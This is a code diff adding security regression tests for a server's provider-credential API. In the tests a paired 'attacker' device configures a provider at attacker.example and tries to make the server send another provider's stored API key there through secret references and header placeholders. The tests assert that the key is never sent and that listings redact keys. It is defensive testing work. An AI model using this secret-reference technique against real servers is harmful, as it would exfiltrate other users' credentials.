@@ -13,11 +13,98 @@ const resources: NeoServices[] = [];
 const directories: string[] = [];
 afterEach(async () => {
   await fixture?.services.close();
+  fixture = undefined!;
   for (const service of resources.splice(0)) await service.close();
   for (const directory of directories.splice(0)) rmSync(directory, { recursive: true, force: true });
+  vi.unstubAllGlobals();
 });
 
+async function liveProviderFixture() {
+  const fetch = vi.fn<typeof globalThis.fetch>(async () => Response.json({ data: [{ id: 'fixture-model' }] }));
+  vi.stubGlobal('fetch', fetch);
+  const services = await createServices(NeoConfigSchema.parse({
+    providers: [{ id: 'configured', kind: 'mock', headers: { 'x-api-key': 'protected-fixture-credential' } }],
+    plugins: { enabled: false }, log: { level: 'silent' },
+  }), { inMemory: true, logger: silentLogger });
+  resources.push(services);
+  const { token } = services.devices.create({ name: 'paired attacker', platform: 'web' });
+  const { app } = createApp(services);
+  const request = (path: string, method = 'POST', body?: unknown) => app.request(path, {
+    method, headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
+    ...(body === undefined ? {} : { body: JSON.stringify(body) }),
+  });
+  const sent = () => fetch.mock.calls.map(([url, init]) => ({
+    url: String(url), headers: Object.fromEntries(new Headers(init?.headers)), body: init?.body,
+  }));
+  expect(services.secrets.get('provider:configured:header:x-api-key')).toBe('protected-fixture-credential');
+  return { services, request, fetch, sent };
+}
+
 describe('provider credential header security', () => {
+  it.each(['POST', 'PATCH'])('blocks the original %s secret-reference attack through the live provider test route', async (method) => {
+    const live = await liveProviderFixture();
+    const attack = { kind: 'openai', baseUrl: 'https://attacker.example/v1', apiKeySecret: 'provider:configured:header:x-api-key' };
+    if (method === 'PATCH') {
+      expect((await live.request('/api/providers', 'POST', { id: 'attack', kind: 'openai', baseUrl: 'https://attacker.example/v1' })).status).toBe(201);
+    }
+    const response = await live.request(method === 'POST' ? '/api/providers' : '/api/providers/attack', method, { id: 'attack', ...attack });
+    expect(response.status).toBe(method === 'POST' ? 201 : 200);
+    const tested = await live.request('/api/providers/attack/test');
+    expect(tested.status).toBe(200);
+    expect(live.services.providerConfigs.get('attack')?.apiKeySecret).toBeUndefined();
+    expect(await tested.json()).toMatchObject({ ok: false });
+    expect(live.fetch).not.toHaveBeenCalled();
+    expect(JSON.stringify(live.sent())).not.toContain('protected-fixture-credential');
+    expect(live.services.secrets.get('provider:configured:header:x-api-key')).toBe('protected-fixture-credential');
+  });
+
+  it.each(['POST', 'PATCH', 'draft'])('never dereferences a cross-provider header in a %s adapter', async (method) => {
+    const live = await liveProviderFixture();
+    const attack = {
+      kind: 'openai', baseUrl: 'https://attacker.example/v1', apiKey: 'attacker-owned-key',
+      apiKeySecret: 'provider:configured:header:x-api-key',
+      headers: { 'x-api-key': 'neo-secret:provider:configured:header:x-api-key' },
+    };
+    if (method === 'draft') {
+      const tested = await live.request('/api/providers/test', 'POST', attack);
+      expect(tested.status).toBe(200);
+      expect(await tested.json()).toMatchObject({ ok: true });
+    } else {
+      if (method === 'PATCH') expect((await live.request('/api/providers', 'POST', { id: 'attack', kind: 'openai' })).status).toBe(201);
+      const changed = await live.request(method === 'POST' ? '/api/providers' : '/api/providers/attack', method, { id: 'attack', ...attack });
+      expect(changed.status).toBe(method === 'POST' ? 201 : 200);
+      expect(await (await live.request('/api/providers/attack/test')).json()).toMatchObject({ ok: true });
+    }
+    expect(live.sent()).toEqual([{
+      url: 'https://attacker.example/v1/models',
+      headers: { authorization: 'Bearer attacker-owned-key', 'x-api-key': 'neo-secret:provider:configured:header:x-api-key' },
+      body: undefined,
+    }]);
+    expect(JSON.stringify(live.sent())).not.toContain('protected-fixture-credential');
+    expect(live.services.secrets.get('provider:configured:header:x-api-key')).toBe('protected-fixture-credential');
+  });
+
+  it('ignores secret references in draft tests without granting access to the secret store', async () => {
+    const live = await liveProviderFixture();
+    const response = await live.request('/api/providers/test', 'POST', {
+      kind: 'openai', baseUrl: 'https://attacker.example/v1', apiKeySecret: 'provider:configured:header:x-api-key',
+    });
+    expect(await response.json()).toMatchObject({ ok: false });
+    expect(live.fetch).not.toHaveBeenCalled();
+  });
+
+  it('creates and replaces inline API keys used by real adapters', async () => {
+    const live = await liveProviderFixture();
+    expect((await live.request('/api/providers', 'POST', { id: 'owned', kind: 'openai', baseUrl: 'https://owned.example/v1', apiKey: 'first-inline-key' })).status).toBe(201);
+    expect(live.services.providerConfigs.get('owned')?.apiKeySecret).toBe('provider:owned');
+    expect(await (await live.request('/api/providers/owned/test')).json()).toMatchObject({ ok: true });
+    expect((await live.request('/api/providers/owned', 'PATCH', { apiKey: 'replacement-inline-key' })).status).toBe(200);
+    expect(await (await live.request('/api/providers/owned/test')).json()).toMatchObject({ ok: true });
+    expect(live.sent().map(({ headers }) => headers['authorization'])).toEqual(['Bearer first-inline-key', 'Bearer replacement-inline-key']);
+    const listed = await live.request('/api/providers', 'GET');
+    expect(await listed.text()).not.toMatch(/first-inline-key|replacement-inline-key|apiKeySecret/);
+  });
+
   it('encrypts all credential header names, redacts API views, and resolves live adapter headers', async () => {
     fixture = routeFixture();
     const headers = {
